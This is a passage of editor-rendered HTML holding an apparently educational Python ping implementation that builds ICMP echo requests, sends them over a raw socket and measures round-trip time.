class="cm-variable">check_sum</span> = <span class="cm-number">0</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">n</span> = <span class="cm-builtin">len</span>(<span class="cm-variable">msg</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">def</span> <span class="cm-def">carry_around_add</span>(<span class="cm-variable">a</span>, <span class="cm-variable">b</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">c</span> = <span class="cm-variable">a</span> <span class="cm-operator">+</span> <span class="cm-variable">b</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> (<span class="cm-variable">c</span> <span class="cm-operator">&amp;</span> <span class="cm-number">0xffff</span>) <span class="cm-operator">+</span> (<span class="cm-variable">c</span> <span class="cm-operator">&gt;&gt;</span> <span class="cm-number">16</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">for</span> <span class="cm-variable">i</span> <span class="cm-keyword">in</span> <span class="cm-builtin">range</span>(<span class="cm-number">0</span>, <span class="cm-variable">n</span>, <span class="cm-number">2</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">w</span> = <span class="cm-variable">msg</span>[<span class="cm-variable">i</span>] <span class="cm-operator">+</span> (<span class="cm-variable">msg</span>[<span class="cm-variable">i</span> <span class="cm-operator">+</span> <span class="cm-number">1</span>] <span class="cm-operator">&lt;&lt;</span> <span class="cm-number">8</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">check_sum</span> = <span class="cm-variable">carry_around_add</span>(<span class="cm-variable">check_sum</span>, <span class="cm-variable">w</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">res</span> = <span class="cm-operator">~</span><span class="cm-variable">check_sum</span> <span class="cm-operator">&amp;</span> <span class="cm-number">0xffff</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">res</span> = <span class="cm-variable">res</span> <span class="cm-operator">&gt;&gt;</span> <span class="cm-number">8</span> <span class="cm-operator">|</span> (<span class="cm-variable">res</span> <span class="cm-operator">&lt;&lt;</span> <span class="cm-number">8</span> <span class="cm-operator">&amp;</span> <span class="cm-number">0xff00</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">res</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">def</span> <span class="cm-def">icmp_packet</span>(<span class="cm-variable">sequence_number</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">36</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param sequence_number:</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">37</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :return: binary of icmp packet</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">38</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  """</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">39</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_type</span> = <span class="cm-number">8</span> &nbsp;<span class="cm-comment"># ICMP Echo Request</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">40</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_code</span> = <span class="cm-number">0</span> &nbsp;<span class="cm-comment"># zero</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">41</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_checksum</span> = <span class="cm-number">0</span> &nbsp;<span class="cm-comment"># set to zero first</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">42</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_Identifier</span> = <span class="cm-number">1</span> &nbsp;<span class="cm-comment"># Identifier</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">43</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_Sequence_number</span> = <span class="cm-variable">sequence_number</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">44</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_Data</span> = <span class="cm-string">b'abcdefghijklmnopqrstuvwabcdefghi'</span> &nbsp;<span class="cm-comment"># data</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">45</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_message</span> = <span class="cm-variable">struct</span>.<span class="cm-property">pack</span>(<span class="cm-string">'&gt;2B3H32s'</span>, <span class="cm-variable">icmp_type</span>, <span class="cm-variable">icmp_code</span>, <span class="cm-variable">icmp_checksum</span>, <span class="cm-variable">icmp_Identifier</span>, <span class="cm-variable">icmp_Sequence_number</span>,</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">46</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">icmp_Data</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">47</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_checksum</span> = <span class="cm-variable">checksum</span>(<span class="cm-variable">icmp_message</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">48</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_message</span> = <span class="cm-variable">struct</span>.<span class="cm-property">pack</span>(<span class="cm-string">'&gt;2B3H32s'</span>, <span class="cm-variable">icmp_type</span>, <span class="cm-variable">icmp_code</span>, <span class="cm-variable">icmp_checksum</span>, <span class="cm-variable">icmp_Identifier</span>, <span class="cm-variable">icmp_Sequence_number</span>,</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">49</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">icmp_Data</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">50</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">icmp_message</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">51</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">52</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">53</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">def</span> <span class="cm-def">icmp_request</span>(<span class="cm-variable">dst_addr</span>, <span class="cm-variable">pkt</span>, <span class="cm-variable">timeout</span>=<span class="cm-number">2</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">54</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">55</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  send icmp packet and return socket for listening</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">56</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param timeout: timeout</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">57</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param dst_addr: ip of destination address</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">58</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param pkt: packet of icmp</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">59</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :return: socket of icmp,time</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">60</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  """</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">61</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_socket</span> = <span class="cm-variable">socket</span>.<span class="cm-property">socket</span>(<span class="cm-variable">socket</span>.<span class="cm-property">AF_INET</span>, <span class="cm-variable">socket</span>.<span class="cm-property">SOCK_RAW</span>, <span class="cm-variable">socket</span>.<span class="cm-property">IPPROTO_ICMP</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">62</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_socket</span>.<span class="cm-property">settimeout</span>(<span class="cm-variable">timeout</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">63</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icmp_socket</span>.<span class="cm-property">sendto</span>(<span class="cm-variable">pkt</span>, (<span class="cm-variable">dst_addr</span>, <span class="cm-number">80</span>))</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">64</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">send_time</span> = <span class="cm-variable">time</span>.<span class="cm-property">time</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">65</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">icmp_socket</span>, <span class="cm-variable">send_time</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">66</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">67</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">68</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">def</span> <span class="cm-def">icmp_reply</span>(<span class="cm-variable">icmp_socket</span>, <span class="cm-variable">send_time</span>, <span class="cm-variable">sequence_num</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">69</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">70</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  monitor the icmp socket and return how much time spent if receives reply msg</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">71</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param icmp_socket:socket which sent icmp msg before</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">72</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param send_time: time when send icmp request</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">73</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param sequence_num:sequence num</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">74</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :return:time and TTL/-1,-1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">75</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  """</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">76</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">try</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">77</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">recv_pkt</span>, <span class="cm-variable">addr</span> = <span class="cm-variable">icmp_socket</span>.<span class="cm-property">recvfrom</span>(<span class="cm-number">1024</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">78</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment"># print(recv_pkt)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">79</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">recv_time</span> = <span class="cm-variable">time</span>.<span class="cm-property">time</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">80</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">icmpHeader</span> = <span class="cm-variable">recv_pkt</span>[<span class="cm-number">20</span>:<span class="cm-number">28</span>]</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">81</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">type</span>, <span class="cm-variable">_</span>, <span class="cm-variable">_</span>, <span class="cm-variable">_</span>, <span class="cm-variable">sequence</span> = <span class="cm-variable">struct</span>.<span class="cm-property">unpack</span>(<span class="cm-string">"&gt;2B3H"</span>, <span class="cm-variable">icmpHeader</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">82</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-builtin">type</span> == <span class="cm-number">0</span> <span class="cm-keyword">and</span> <span class="cm-variable">sequence</span> == <span class="cm-variable">sequence_num</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">83</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">recv_time</span> <span class="cm-operator">-</span> <span class="cm-variable">send_time</span>, <span class="cm-variable">recv_pkt</span>[<span class="cm-number">8</span>]</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">84</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">except</span> <span class="cm-variable">socket</span>.<span class="cm-property">timeout</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">85</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-operator">-</span><span class="cm-number">1</span>, <span class="cm-operator">-</span><span class="cm-number">1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">86</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">87</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">88</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">def</span> <span class="cm-def">ping</span>(<span class="cm-variable">host</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">89</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">90</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param host:domain name or ip addr</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">91</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :return: None</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">92</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  """</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">93</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">Sequence_number</span> = <span class="cm-variable">random</span>.<span class="cm-property">randint</span>(<span class="cm-number">0</span>, <span class="cm-number">10</span> <span 